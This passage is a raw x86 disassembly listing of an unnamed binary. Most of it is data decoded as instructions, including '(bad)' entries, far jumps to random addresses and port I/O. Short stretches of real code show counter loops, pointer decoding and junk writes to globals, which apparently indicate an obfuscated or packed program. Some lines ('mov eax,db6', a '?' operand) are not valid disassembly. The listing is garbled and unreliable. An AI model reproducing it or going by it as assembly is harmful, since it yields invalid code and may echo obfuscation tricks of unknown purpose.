  40484b:	fisttp QWORD PTR [esi+0x7f652044]
  404851:	pop    DWORD PTR ds:[edx]
  404854:	shl    DWORD PTR [esi-0x22baacfd],cl
  40485a:	mov    BYTE PTR [ecx],0xdb
  40485d:	pop    esp
  40485e:	rcl    DWORD PTR [ecx],1
  404860:	jns    0x404800
  404862:	mov    dh,0x43
  404864:	daa    
  404865:	add    eax,0x12216723
  40486a:	fstp   TBYTE PTR [esi]
  40486c:	dec    edi
  40486d:	loopne 0x40483c
  40486f:	xchg   esp,eax
  404870:	add    ebp,DWORD PTR ds:0x45d8a605
  404876:	mov    WORD PTR [edi],es
  404878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404879:	loop   0x4048d1
  40487b:	mov    eax,0xadc48559
  404880:	ins    BYTE PTR es:[edi],dx
  404881:	inc    ebx
  404882:	sbb    al,0xe4
  404884:	loope  0x4048a0
  404886:	pushf  
  404887:	inc    ebp
  404888:	arpl   sp,cx
  40488a:	sub    al,0xd6
  40488c:	mov    ebx,edi
  40488e:	xchg   esi,eax
  40488f:	aaa    
  404890:	adc    eax,DWORD PTR [edx]
  404892:	in     al,0x62
  404894:	les    eax,FWORD PTR [ebx+0x54c0d5d1]
  40489a:	dec    esi
  40489b:	mov    ebx,0x467d63ba
  4048a0:	ins    DWORD PTR es:[edi],dx
  4048a1:	dec    esi
  4048a2:	mov    dl,0xeb
  4048a4:	test   al,0x4
  4048a6:	arpl   WORD PTR [ebp+ebp*4+0x59ec26dc],bp
  4048ad:	(bad)  
  4048af:	test   al,0x76
  4048b1:	sti    
  4048b2:	mov    ecx,0x14884fcc
  4048b7:	es add al,0x3e
  4048ba:	or     edx,DWORD PTR [esi]
  4048bc:	popa   
  4048bd:	outs   dx,DWORD PTR ds:[esi]
  4048be:	addr16 inc esi
  4048c0:	fimul  DWORD PTR [edi-0x7f]
  4048c4:	xchg   ebx,eax
  4048c5:	pusha  
  4048c6:	pop    ss
  4048c7:	das    
  4048c8:	(bad)  
  4048c9:	pop    edi
  4048ca:	add    dh,bl
  4048cc:	inc    edi
  4048cd:	pop    ds
  4048ce:	or     BYTE PTR [esp+ebx*8-0x2d],cl
  4048d2:	pusha  
  4048d3:	jmp    0x34e9743d
  4048d8:	std    
  4048d9:	std    
  4048da:	dec    ecx
  4048db:	jmp    0x712538a1
  4048e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048e1:	or     eax,DWORD PTR [edi+edi*1]
  4048e4:	dec    esp
  4048e5:	xchg   ecx,eax
  4048e6:	pop    ebp
  4048e7:	xchg   esp,eax
  4048e8:	or     esp,DWORD PTR [ebx]
  4048ea:	or     DWORD PTR [esi+0x5784f9a7],ecx
  4048f0:	pop    ebp
  4048f1:	xor    BYTE PTR [ecx],bh
  4048f3:	jmp    0xf6c338be
  4048f8:	pop    ebp
  4048f9:	jb     0x4048c8
  4048fb:	xchg   ecx,eax
  4048fc:	xchg   ebp,eax
  4048fd:	mov    eax,ds:0x60fe03a1
  404902:	push   edx
  404903:	mov    eax,ds:0xc552ec80
  404908:	add    edx,DWORD PTR [edi+0x4b16858]
  40490e:	bound  eax,QWORD PTR [eax]
  404910:	add    eax,0x66f6782c
  404915:	les    eax,FWORD PTR [esi+0x398ad105]
  40491b:	int    0x4a
  40491d:	jl     0x404922
  40491f:	repz fdivp st(7),st
  404922:	pop    es
  404923:	mov    DWORD PTR ds:[ebp-0x24],0xf89c85d8
  40492b:	mov    eax,DWORD PTR [ebp-0xc]
  40492e:	sbb    DWORD PTR ds:0x417e59,0x417e51
  404938:	xor    eax,esi
  40493a:	sub    DWORD PTR ds:0x41abde,0x4245ba
  404944:	jmp    0x404abd
  404949:	fst    QWORD PTR [ebx]
  40494b:	cdq    
  40494c:	loope  0x4049a7
  40494e:	jns    0x4049a5
  404950:	and    eax,esi
  404952:	scas   al,BYTE PTR es:[edi]
  404953:	pop    ss
  404954:	adc    esi,DWORD PTR [bp+si-0x35a4]
  404959:	fidivr DWORD PTR [edi+0x7e]
  40495c:	jle    0x404938
  40495e:	jg     0x4049de
  404960:	jle    0x404993
  404962:	or     ecx,DWORD PTR [edx-0x38c09922]
  404968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404969:	pushf  
  40496a:	mov    bh,0xf0
  40496c:	and    eax,0xed63d7f0
  404971:	icebp  
  404972:	retf   
  404973:	xlat   BYTE PTR ds:[ebx]
  404974:	int    0xaa
  404976:	mov    eax,0x22e13bc1
  40497b:	pop    ebx
  40497c:	cmc    
  40497d:	repnz call 0x7c5f:0x23e2fe7a
  404985:	xchg   ebp,eax
  404986:	mov    cl,0x6a
  404989:	loope  0x4049d7
  40498b:	dec    ecx
  40498c:	fld    TBYTE PTR [edx]
  40498e:	xor    ah,dh
  404990:	jbe    0x404a0b
  404992:	aas    
  404993:	dec    edi
  404994:	imul   edx,DWORD PTR [eax+0x3cfc803a],0x0
  40499b:	call   0x32cb5a2c
  4049a0:	nop
  4049a1:	or     eax,0x5852c49f
  4049a6:	retf   
  4049a7:	mov    esp,0x8dfa69c3
  4049ac:	jle    0x4049e5
  4049ae:	xor    DWORD PTR [edx-0x7d],ecx
  4049b1:	mov    dl,0x4c
  4049b3:	aaa    
  4049b4:	sub    edx,DWORD PTR [esp+ecx*2-0x370f4d07]
  4049bb:	cmp    BYTE PTR [ecx+0x61],bh
  4049be:	push   esi
  4049bf:	aad    0x88
  4049c1:	jns    0x40498d
  4049c3:	jmp    0x4049cc
  4049c5:	retf   
  4049c6:	icebp  
  4049c7:	out    0xc2,al
  4049c9:	(bad)  
  4049ca:	push   eax
  4049cb:	aam    0xba
  4049cd:	outs   dx,DWORD PTR ds:[esi]
  4049ce:	in     al,dx
  4049cf:	pop    ebx
  4049d0:	jae    0x4049f5
  4049d2:	fldenv [ecx-0x6d]
  4049d5:	dec    ebx
  4049d6:	push   edx
  4049d7:	mov    ds:0xc370c88f,eax
  4049dc:	jmp    0xc250:0x47c95d91
  4049e3:	arpl   WORD PTR [esi-0x262cd7bc],cx
  4049e9:	and    si,WORD PTR [esi-0x7c]
  4049ed:	mov    bl,ch
  4049ef:	jl     0x4049fe
  4049f1:	push   cs
  4049f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049f3:	jmp    0x41ad:0x1d22be6f
  4049fa:	scas   al,BYTE PTR es:[edi]
  4049fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049fc:	xor    ch,BYTE PTR [ebp-0x9]
  4049ff:	bound  ebx,QWORD PTR [edi+0x49]
  404a02:	jp     0x404a17
  404a04:	pop    ebx
  404a05:	fcomp  DWORD PTR [ecx+0x2e7e9403]
  404a0b:	push   ecx
  404a0c:	mov    ebp,0xa3e0576f
  404a11:	cmp    BYTE PTR [edi+esi*4],bh
  404a14:	sub    bh,al
  404a16:	clc    
  404a17:	xchg   edi,eax
  404a18:	aam    0x8c
  404a1a:	push   ebp
  404a1b:	sbb    edx,0x32
  404a1e:	daa    
  404a1f:	aam    0xb3
  404a21:	in     eax,dx
  404a22:	pop    esp
  404a23:	sbb    eax,0x213a0b4f
  404a28:	daa    
  404a29:	and    eax,0x611abef4
  404a2e:	stos   BYTE PTR es:[edi],al
  404a2f:	popa   
  404a30:	in     al,0x58
  404a32:	js     0x404a75
  404a34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a35:	and    eax,ecx
  404a37:	add    BYTE PTR [eax-0x7516fb43],ah
  404a3d:	pop    es
  404a3e:	sbb    eax,0xff9c2887
  404a43:	xor    al,0x5f
  404a45:	in     eax,0x29
  404a47:	mov    cl,0x6d
  404a49:	jp     0x404a59
  404a4b:	jmp    0xf4e57e62
  404a50:	sub    al,0x66
  404a52:	loopne 0x404a8c
  404a54:	inc    ebp
  404a55:	jbe    0x404a59
  404a57:	cwde   
  404a58:	dec    eax
  404a59:	cli    
  404a5a:	in     al,dx
  404a5b:	pop    edi
  404a5c:	das    
  404a5d:	fistp  WORD PTR [eax+0x64b74b3f]
  404a63:	mov    ecx,0x1a4bc446
  404a68:	push   ds
  404a69:	or     dl,BYTE PTR [eax]
  404a6b:	jl     0x404ac5
  404a6d:	fdiv   DWORD PTR [edi-0x4755d21c]
  404a73:	mov    ebp,0xbe31001
  404a78:	mov    ah,0x90
  404a7a:	mov    edi,gs
  404a7c:	popf   
  404a7d:	ror    DWORD PTR [ebx],0xd0
  404a80:	sahf   
  404a81:	sbb    al,dl
  404a83:	fdivr  DWORD PTR [eax+0x2]
  404a86:	outs   dx,BYTE PTR ds:[esi]
  404a87:	mov    ecx,0xdb3432a7
  404a8c:	jo     0x404aba
  404a8e:	ficomp WORD PTR [ecx]
  404a90:	scas   al,BYTE PTR es:[edi]
  404a91:	mov    cl,BYTE PTR [edx]
  404a93:	mov    eax,db6
  404a96:	pop    esi
  404a97:	pushf  
  404a98:	push   eax
  404a99:	repz (bad) 
  404a9b:	fidivr DWORD PTR [ecx]
  404a9d:	jnp    0x404aed
  404a9f:	inc    eax
  404aa0:	std    
  404aa1:	std    
  404aa2:	rcl    bh,1
  404aa4:	mov    ds:0x348b0d86,eax
  404aa9:	push   ebx
  404aaa:	adc    DWORD PTR [edi],esi
  404aac:	pop    es
  404aad:	push   0x61509a63
  404ab2:	aaa    
  404ab3:	in     al,dx
  404ab4:	repnz mov ds:0x9450e563,eax
  404aba:	retf   
  404abb:	jbe    0x404ae6
  404abd:	add    eax,edi
  404abf:	mov    DWORD PTR [ebp-0x18],eax
  404ac2:	and    DWORD PTR ds:0x4245ba,0x0
  404acc:	jmp    0x404adc
  404ad1:	mov    eax,ds:0x4245ba
  404ad6:	inc    eax
  404ad7:	mov    ds:0x4245ba,eax
  404adc:	cmp    DWORD PTR ds:0x4245ba,0x1e
  404ae3:	jae    0x404b28
  404ae9:	cmp    DWORD PTR ds:0x4245ba,0x6
  404af0:	jne    0x404b01
  404af6:	push   0x41ae97
  404afb:	call   DWORD PTR ds:0x40d1c4
  404b01:	cmp    DWORD PTR ds:0x4245ba,0x5
  404b08:	jne    0x404b19
  404b0e:	mov    eax,ds:0x4245ba
  404b13:	inc    eax
  404b14:	mov    ds:0x4245ba,eax
  404b19:	jmp    0x404ad1
  404b1e:	sub    DWORD PTR ds:0x415111,0xc33
  404b28:	mov    DWORD PTR [ebp-0x1c],0xf89c853f
  404b2f:	mov    BYTE PTR [ebp-0x1],0x57
  404b33:	sub    DWORD PTR ds:0x417e59,edi
  404b39:	mov    eax,DWORD PTR [ebp-0xc]
  404b3c:	xor    eax,esi
  404b3e:	and    DWORD PTR ds:0x415115,0x5145
  404b48:	add    eax,edi
  404b4a:	mov    DWORD PTR [ebp-0x18],eax
  404b4d:	mov    eax,DWORD PTR [ebp-0x24]
  404b50:	xor    eax,esi
  404b52:	adc    DWORD PTR ds:0x41abde,0x3f71
  404b5c:	add    eax,edi
  404b5e:	and    DWORD PTR ds:0x4245be,0x352e
  404b68:	push   eax
  404b69:	dec    eax
  404b6a:	mov    eax,DWORD PTR [ebp-0x28]
  404b6d:	xor    eax,esi
  404b6f:	and    DWORD PTR ds:0x4245b2,0x41abce
  404b79:	add    eax,edi
  404b7b:	xor    DWORD PTR ds:0x41abda,0x41237c
  404b85:	push   eax
  404b86:	and    DWORD PTR ds:0x4245be,0x41abe2
  404b90:	mov    eax,DWORD PTR [ebp-0x1c]
  404b93:	jmp    0x404d0c
  404b98:	push   0xffffff9c
  404b9a:	mov    ds:0x7b617853,al
  404b9f:	xchg   ebp,eax
  404ba0:	push   ebx
  404ba1:	mov    DWORD PTR [ecx+0x3f],esp
  404ba4:	jae    0x404b99
  404ba6:	imul   ebp,DWORD PTR [edi+0x7e7e7ca6],0x7e7e7fda
  404bb0:	push   ebp
  404bb1:	cld    
  404bb2:	and    eax,0x4ceadc88
  404bb7:	sub    esi,esp
  404bb9:	adc    bl,0x3b
  404bbc:	and    esi,esp
  404bbe:	iret   
  404bbf:	stc    
  404bc0:	rcl    DWORD PTR [edi-0x52],1
  404bc3:	bound  ebx,QWORD PTR [esi]
  404bc5:	xor    dl,cl
  404bc7:	scas   al,BYTE PTR es:[edi]
  404bc8:	mov    esp,0xa38074f4
  404bcd:	xchg   edx,eax
  404bce:	repnz xor BYTE PTR [edi+0x7591a2ec],bl
  404bd5:	imul   eax,DWORD PTR [eax],0xc
  404bd8:	pushf  
  404bd9:	mov    eax,0x319cf267
  404bde:	shl    BYTE PTR [eax],1
  404be0:	or     DWORD PTR [ebp-0x18c00f8d],edx
  404be6:	popa   
  404be7:	adc    dh,BYTE PTR [eax]
  404be9:	jle    0x404c42
  404beb:	daa    
  404bec:	jp     0x404ba1
  404bee:	cld    
  404bef:	clc    
  404bf0:	xchg   BYTE PTR [edi-0x62f59e31],al
  404bf6:	sub    BYTE PTR [ebp-0x45c6a1a7],cl
  404bfc:	not    BYTE PTR cs:[esi+eiz*2]
  404c00:	push   eax
  404c01:	mul    ch
  404c03:	dec    eax
  404c04:	dec    eax
  404c05:	jp     0x404be6
  404c07:	out    0x83,eax
  404c09:	sub    bh,ah
  404c0b:	inc    eax
  404c0c:	repnz sahf 
  404c0e:	xchg   edi,eax
  404c0f:	cld    
  404c10:	out    0xf0,eax
  404c12:	scas   al,BYTE PTR es:[edi]
  404c13:	mov    ecx,0x891da043
  404c18:	pop    eax
  404c19:	sbb    DWORD PTR [esi],0x2d
  404c1c:	hlt    
  404c1d:	and    esi,DWORD PTR [ebp+0x11284d1c]
  404c23:	dec    ecx
  404c24:	retf   0xff52
  404c27:	add    eax,0x74073c2d
  404c2c:	xchg   BYTE PTR [edx+0x73],bl
  404c2f:	fisub  WORD PTR [edx+0x49aeb3bc]
  404c35:	frndint 
  404c37:	cmp    ah,BYTE PTR [ecx-0x2a]
  404c3a:	icebp  
  404c3b:	stos   DWORD PTR es:[edi],eax
  404c3c:	daa    
  404c3d:	fstp   st(2)
  404c3f:	les    esi,FWORD PTR [ebx+0x15ab1ec5]
  404c45:	and    DWORD PTR [edx+0x2],esi
  404c48:	push   ebx
  404c49:	mov    ah,BYTE PTR [ecx+0x2580790d]
  404c4f:	xor    eax,DWORD PTR [ebx+0x61a93fec]
  404c55:	and    eax,DWORD PTR [edi]
  404c57:	xor    DWORD PTR [ecx+0x3cc8f37e],edi
  404c5d:	std    
  404c5e:	push   cs
  404c5f:	sub    eax,0x4c281387
  404c64:	and    eax,0x91f676f2
  404c69:	pop    ds
  404c6a:	jo     0x404bed
  404c6c:	jbe    0x404c47
  404c6e:	je     0x404cdd
  404c70:	push   eax
  404c71:	dec    ecx
  404c72:	mov    bh,0x1
  404c74:	push   0x8021b190
  404c79:	and    eax,0xc5474b97
  404c7e:	test   BYTE PTR [ecx+ebx*1-0x79ff24c7],dl
  404c85:	daa    
  404c86:	sbb    eax,0xf15616e9
  404c8b:	out    0x1c,al
  404c8d:	mov    esi,0xf26e36e2
  404c92:	push   ebp
  404c93:	mov    WORD PTR [ebp+0x3583dac9],cs
  404c99:	push   esi
  404c9a:	out    dx,eax
  404c9b:	repnz stos DWORD PTR es:[edi],eax
  404c9d:	pushf  
  404c9e:	push   es
  404c9f:	mov    edi,0xfebb463
  404ca4:	push   ebx
  404ca5:	outs   dx,DWORD PTR ds:[esi]
  404ca6:	inc    edx
  404ca7:	out    0xf2,eax
  404ca9:	push   ebp
  404caa:	ss cmp ecx,ebx
  404cad:	sub    al,0xdc
  404caf:	(bad)  
  404cb1:	das    
  404cb2:	dec    ebx
  404cb3:	pop    ebx
  404cb4:	sbb    DWORD PTR [ecx-0x69c76dc3],0x52
  404cbb:	scas   eax,DWORD PTR es:[edi]
  404cbc:	pop    ecx
  404cbd:	and    dl,BYTE PTR [eax-0x67e4a03e]
  404cc3:	loop   0x404d14
  404cc5:	jbe    0x404c61
  404cc7:	xchg   ecx,eax
  404cc8:	and    al,0x81
  404cca:	or     BYTE PTR [esi],0xc5
  404ccd:	xchg   DWORD PTR [edi-0x6b],esp
  404cd0:	inc    edi
  404cd1:	pop    ss
  404cd2:	jno    0x404c9e
  404cd4:	imul   ebp,DWORD PTR [ebx-0x19],0x2c91bfb3
  404cdb:	cmp    bl,0x25
  404cde:	xchg   ecx,eax
  404cdf:	sub    al,0x7f
  404ce1:	mov    dl,0xa2
  404ce3:	adc    al,0xbf
  404ce5:	dec    ebx
  404ce6:	dec    ecx
  404ce7:	jle    0x404d17
  404ce9:	push   DWORD PTR [edi+ebp*1-0x45]
  404ced:	stc    
  404cee:	mov    ds:0x24ce83c2,eax
  404cf3:	mov    ah,0x19
  404cf5:	iret   
  404cf6:	adc    al,0xe2
  404cf8:	fdiv   DWORD PTR [edx+0x48135ed6]
  404cfe:	adc    al,0x5a
  404d00:	cmp    BYTE PTR [edi],ah
  404d02:	mov    ecx,0x4010d30c
  404d07:	inc    esp
  404d08:	mov    al,0x24
  404d0a:	in     eax,0x9d
  404d0c:	xor    eax,esi
  404d0e:	neg    DWORD PTR ds:0x415105
  404d14:	add    eax,edi
  404d16:	xor    DWORD PTR ds:0x412364,0x39b1
  404d20:	push   eax
  404d21:	lea    eax,[ebp-0x78]
  404d24:	push   eax
  404d25:	mov    DWORD PTR ds:0x41237c,0x6752
  404d2f:	push   DWORD PTR [ebp-0xc]
  404d32:	sub    DWORD PTR ds:0x415111,0x1b2b
  404d3c:	push   DWORD PTR [ebp-0x14]
  404d3f:	sub    DWORD PTR ds:0x4245b6,0x412364
  404d49:	call   0x409363
  404d4e:	inc    DWORD PTR ds:0x415119
  404d54:	test   eax,eax
  404d56:	mov    DWORD PTR ds:0x4245b6,0x71ec
  404d60:	je     0x404de0
  404d66:	sub    DWORD PTR ds:0x417e59,0x4245ca
  404d70:	lea    eax,[ebp-0x78]
  404d73:	neg    DWORD PTR ds:0x4245be
  404d79:	push   eax
  404d7a:	add    eax,DWORD PTR ds:0x4245ca
  404d80:	mov    eax,DWORD PTR [ebp-0x14]
  404d83:	and    DWORD PTR ds:0x417e59,0xd95
  404d8d:	xor    eax,esi
  404d8f:	add    eax,edi
  404d91:	and    DWORD PTR ds:0x417e3d,0x71b6
  404d9b:	push   eax
  404d9c:	mov    eax,DWORD PTR [ebp-0x10]
  404d9f:	add    eax,0xaa
  404da4:	push   eax
  404da5:	and    DWORD PTR ds:0x41abd2,0x17f4
  404daf:	mov    eax,DWORD PTR [ebp-0x10]
  404db2:	sub    DWORD PTR ds:0x417e55,0x41236c
  404dbc:	mov    eax,DWORD PTR [eax+0x198]
  404dc2:	push   DWORD PTR [eax]
  404dc4:	add    DWORD PTR ds:0x417e55,0x417e3d
  404dce:	call   0x40ae4d
  404dd3:	mov    DWORD PTR ds:0x41abd6,0x35a
  404ddd:	mov    DWORD PTR [ebp-0x8],eax
  404de0:	mov    DWORD PTR ds:0x412368,0x764e
  404dea:	cmp    DWORD PTR [ebp-0x8],0x0
  404dee:	not    DWORD PTR ds:0x412364
  404df4:	lea    eax,[ebp+0x4]
  404df7:	mov    DWORD PTR [ebp-0x20],eax
  404dfa:	je     0x405842
  404e00:	lea    eax,[ebp-0x18]
  404e03:	jmp    0x404f7c
  404e08:	ja     0x404d8f
  404e0a:	(bad)  
  404e0b:	je     0x404d9a
  404e0d:	je     0x404d94
  404e0f:	test   DWORD PTR [esi],edi
  404e11:	push   ebx
  404e12:	outs   dx,DWORD PTR ds:[esi]
  404e13:	jne    0x404df0
  404e15:	add    edi,DWORD PTR [esi+0x7e720209]
  404e1b:	jle    0x404df7
  404e1d:	jg     0x404e9d
  404e1f:	jle    0x404e6c
  404e21:	in     al,0xad
  404e23:	push   ecx
  404e24:	scas   eax,DWORD PTR es:[edi]
  404e25:	(bad)  
  404e26:	sahf   
  404e27:	or     eax,0xf36cfef5
  404e2c:	icebp  
  404e2d:	dec    eax
  404e2e:	inc    eax
  404e2f:	xchg   edx,eax
  404e30:	jae    0x404ea1
  404e32:	jmp    0xaca:0xc18e4953
  404e39:	adc    BYTE PTR [edi],0x14
  404e3c:	js     0x404e12
  404e3e:	adc    esp,0xffffffe3
  404e41:	push   edx
  404e42:	rol    BYTE PTR [esi],1
  404e44:	out    0xe8,eax
  404e46:	repnz push ss
  404e48:	and    DWORD PTR [ebx+0x7621d361],eax
  404e4e:	test   DWORD PTR [ebx+0x7],edi
  404e51:	cwde   
  404e52:	pop    es
  404e53:	mov    ds:0x5afbd84b,al
  404e58:	sub    edi,eax
  404e5a:	xchg   ebx,eax
  404e5b:	dec    edx
  404e5c:	(bad)  
  404e5d:	leave  
  404e5e:	sar    DWORD PTR [ecx+0x3b],cl
  404e61:	jae    0x404e9e
  404e63:	mov    eax,0x12e4c36b
  404e68:	jno    0x404e0c
  404e6a:	mov    bh,0x10
  404e6c:	adc    eax,DWORD PTR [ebx-0x51d0a129]
  404e72:	stc    
  404e73:	dec    ecx
  404e74:	test   al,0xbe
  404e76:	(bad)  
  404e77:	ds mov edx,0x49d3bff
  404e7d:	jb     0x404e84
  404e7f:	xlat   BYTE PTR ds:[ebx]
  404e80:	pop    ds
  404e81:	icebp  
  404e82:	sbb    ebx,DWORD PTR [edi-0x7b]
  404e85:	xor    al,0x25
  404e87:	cli    
  404e88:	fiadd  DWORD PTR [ebx]
  404e8a:	(bad)  
  404e8b:	fcmovb st,st(3)
  404e8d:	xchg   edx,eax
  404e8e:	xor    esi,DWORD PTR [ebx]
  404e90:	arpl   WORD PTR [ebp+0x790bb0c],dx
  404e96:	loopne 0x404ea1
  404e98:	int3   
  404e99:	jmp    0x404ec5
  404e9b:	xchg   ebx,eax
  404e9c:	arpl   WORD PTR ds:0x7adb435e,bx
  404ea2:	mov    eax,0x3d9c1067
  404ea7:	loopne 0x404ef0
  404ea9:	call   0xcd36a088
  404eae:	cmp    BYTE PTR [edi],al
  404eb0:	mov    ecx,eax
  404eb2:	neg    BYTE PTR fs:[ebp-0x35]
  404eb6:	in     eax,dx
  404eb7:	mov    esi,0xbc0c97f3
  404ebc:	pop    edi
  404ebd:	dec    ebx
  404ebe:	xor    DWORD PTR [esi+0x5a73c1ba],edi
  404ec4:	bound  edi,QWORD PTR [eax]
  404ec6:	xchg   ebp,eax
  404ec7:	push   ecx
  404ec8:	pop    ecx
  404ec9:	mov    al,0x8d
  404ecb:	cmp    al,0xd1
  404ecd:	repnz inc edi
  404ecf:	dec    esp
  404ed0:	xchg   ebp,eax
  404ed1:	adc    eax,0xee706155
  404ed6:	imul   ebp,DWORD PTR [esi+0x3e],0x5afbd5e6
  404edd:	inc    edi
  404ede:	push   ss
  404edf:	xor    al,0x15
  404ee1:	cld    
  404ee2:	jo     0x404eab
  404ee4:	inc    ebp
  404ee5:	ss popa 
  404ee7:	xchg   ebx,eax
  404ee8:	fld    TBYTE PTR [eax+0x73]
  404eeb:	sub    al,0x14
  404eed:	xchg   edi,eax
  404eee:	adc    DWORD PTR [eax-0x1],ecx
  404ef1:	sub    DWORD PTR [eax],eax
  404ef3:	enter  0x894e,0x5e
  404ef7:	jnp    0x404f08
  404ef9:	test   al,0xa2
  404efb:	mov    ebp,0xd0b5fe52
  404f00:	xchg   BYTE PTR [edx],bl
  404f02:	pop    esi
  404f03:	sbb    DWORD PTR [edx],ebp
  404f05:	gs mov edi,0xdfd94d5
  404f0b:	pop    ds
  404f0c:	and    edi,DWORD PTR [ecx]
  404f0e:	shl    ebp,cl
  404f10:	pop    es
  404f11:	test   eax,0x203c359b
  404f16:	xor    ah,BYTE PTR [edi]
  404f18:	js     0x404ed5
  404f1a:	ret    
  404f1b:	(bad)  
  404f1c:	jns    0x404f19
  404f1e:	cmc    
  404f1f:	inc    esi
  404f20:	or     al,0xfa
  404f22:	lea    ecx,[edi-0x1e]
  404f25:	loope  0x404f2b
  404f27:	sub    BYTE PTR ds:0x8ffb9057,0x1
  404f2e:	sti    
  404f2f:	fld    DWORD PTR [ebp+0x4c619785]
  404f35:	fsubr  DWORD PTR [esi+esi*1-0x3d]
  404f39:	imul   ecx,esi,0x57183077
  404f3f:	xchg   esp,eax
  404f40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f41:	test   BYTE PTR [ecx+0x7a],ch
  404f44:	mov    bl,BYTE PTR [edi-0x3fc23ad7]
  404f4a:	lea    esi,[esi]
  404f4c:	jns    0x404f2b
  404f4e:	dec    esi
  404f4f:	adc    DWORD PTR [edi-0x4b],0xa0aaf801
  404f56:	push   ds
  404f57:	xlat   BYTE PTR ds:[ebx]
  404f58:	ret    0x2355
  404f5b:	dec    eax
  404f5c:	loopne 0x404f7e
  404f5e:	jp     0x404f5e
  404f60:	sub    dh,BYTE PTR [edx+0x51b13497]
  404f66:	cdq    
  404f67:	jbe    0x404f5d
  404f69:	cmp    eax,0x69068bd7
  404f6e:	mul    BYTE PTR [eax+0x46]
  404f71:	mov    ds:0xee812024,eax
  404f76:	adc    al,0xbe
  404f78:	xchg   ecx,eax
  404f79:	pop    esp
  404f7a:	jg     0x404f35
  404f7c:	push   eax
  404f7d:	and    DWORD PTR ds:0x4245ae,0x0
  404f87:	jmp    0x404f97
  404f8c:	mov    eax,ds:0x4245ae
  404f91:	inc    eax
  404f92:	mov    ds:0x4245ae,eax
  404f97:	cmp    DWORD PTR ds:0x4245ae,0x1e
  404f9e:	jae    0x404fc0
  404fa4:	cmp    DWORD PTR ds:0x4245ae,0x22
  404fab:	jne    0x404fba
  404fb1:	push   DWORD PTR [ebp-0x28]
  404fb4:	call   DWORD PTR ds:0x40d298
  404fba:	jmp    0x404f8c
  404fbf:	inc    eax
  404fc0:	mov    eax,DWORD PTR [ebp-0x2c]
  404fc3:	adc    DWORD PTR ds:0x412354,0x412370
  404fcd:	xor    eax,esi
  404fcf:	add    eax,edi
  404fd1:	and    DWORD PTR ds:0x415115,0x3c83
  404fdb:	jmp    0x405154
  404fe0:	adc    al,0x10
  404fe2:	imul   DWORD PTR [edx]
  404fe4:	mov    ebp,DWORD PTR [ecx+0x1f8510a9]
  404fea:	and    DWORD PTR [edx-0x7b7ac231],esi
  404ff0:	out    dx,al
  404ff1:	jae    0x405071
  404ff3:	jle    0x404fcf
  404ff5:	jg     0x405075
  404ff7:	jle    0x405020
  404ff9:	sub    eax,0x8f74be1f
  404ffe:	mov    al,BYTE PTR [ebx-0x43]
  405001:	cmp    al,0x7c
  405003:	pop    ds
  405004:	jmp    0x5c1c:0x47aba284
  40500b:	retf   
  40500c:	mov    WORD PTR [ecx+0x37],?
  40500f:	aam    0xd4
  405011:	xchg   esi,eax
  405012:	inc    ebx
  405013:	dec    ecx
  405014:	mov    bh,0xbc
  405016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405017:	pop    esi
  405018:	and    eax,0xddb12041
  40501d:	retf   
  40501e:	repnz loope 0x404fcb
  405021:	test   DWORD PTR [ebp+0x2b],esi
  405024:	repnz mov esi,0xe4c78d69
  40502a:	loop   0x40508f
  40502c:	adc    bh,BYTE PTR [ebx+ebx*8]
  40502f:	addr16 test al,0x4
  405032:	jno    0x405095
  405034:	xor    ecx,ecx
  405036:	pop    edi
  405037:	cmp    al,0xfa
  405039:	push   ebx
  40503a:	repnz mov esp,0x3d532ce4
  405040:	xchg   edx,eax
  405041:	jg     0x4050ad
  405043:	dec    ecx
  405044:	push   0xe8893bd5
  405049:	test   eax,0x82ba6e5b
  40504e:	cmp    al,0x1f
  405050:	mov    esp,0x8ea906c1
  405055:	mov    ds:0x7e61b3fd,eax
  40505a:	imul   ebx,DWORD PTR [ecx+0x5d],0xffffffb5
  40505e:	dec    esi
  40505f:	cld    
  405060:	mov    esp,DWORD PTR [edi+0x7b76698f]
  405066:	inc    ebp
  405067:	inc    ecx
  405068:	mov    dl,0xdc
  40506a:	lods   eax,DWORD PTR ds:[esi]
  40506b:	push   eax
  40506c:	xor    eax,0xe8467b5a
  405071:	mov    BYTE PTR [ebx],al
  405073:	ret    0xeb62
  405076:	push   eax
  405077:	int    0xd9
  405079:	sbb    bh,al
  40507b:	lods   eax,DWORD PTR ds:[esi]
  40507c:	fdivr  DWORD PTR [esi-0x28]
  40507f:	ficom  WORD PTR [ecx-0x16]
  405082:	dec    edi
  405083:	aam    0xc2
  405085:	xor    BYTE PTR [eax+0x53399476],bl
  40508b:	lds    edi,FWORD PTR [edx]
  40508d:	push   cs
  40508e:	mov    ecx,0xb926cf5a
  405093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405094:	ja     0x4050a4
  405096:	sti    
  405097:	out    dx,eax
  405098:	(bad)  
  405099:	sbb    ebx,DWORD PTR ds:0x32f4caad
  40509f:	push   0xc71db61d
  4050a4:	(bad)  
  4050a5:	jae    0x4050b1
  4050a7:	xor    DWORD PTR [ecx-0x1e],edi
  4050aa:	div    DWORD PTR [eax+eax*2-0x6b349955]
  4050b1:	call   0xdb577d62
  4050b6:	pop    edi
  4050b7:	loope  0x405105
  4050b9:	test   al,0xf4
  4050bb:	das    
  4050bc:	sbb    eax,0x644b0986
  4050c1:	(bad)  
  4050c2:	clc    
  4050c3:	lds    ebx,FWORD PTR [ebx]
  4050c5:	hlt    
  4050c6:	inc    ecx
  4050c7:	fwait
  4050c8:	cmp    BYTE PTR [ebx+ebp*8-0xc1ee99d],ah
  4050cf:	fstp   DWORD PTR [eax+ecx*4]
  4050d2:	and    esi,DWORD PTR [edx+eiz*2]
  4050d5:	retf   0x53c8
  4050d8:	daa    
  4050d9:	dec    esp
  4050da:	sbb    ah,BYTE PTR [ebx-0x45836115]
  4050e0:	add    eax,0x5a066f31
  4050e5:	imul   esp,DWORD PTR [edx+0x3bff182],0x9282ded5
  4050ef:	cmp    eax,0x7c4122b8
  4050f4:	bound  edx,QWORD PTR [ecx-0x17]
  4050f7:	mov    BYTE PTR [ebp-0x76008036],dl
